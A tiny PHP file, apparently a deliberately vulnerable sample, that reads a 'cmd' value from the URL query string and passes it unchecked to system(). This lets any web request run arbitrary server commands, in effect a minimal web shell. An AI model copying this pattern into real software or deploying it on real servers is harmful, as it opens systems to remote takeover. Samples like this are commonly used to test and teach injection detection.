<?php
function read_user_command() {
    return $_GET["cmd"];
}
function handle() {
    $c = read_user_command();
    system($c);
}
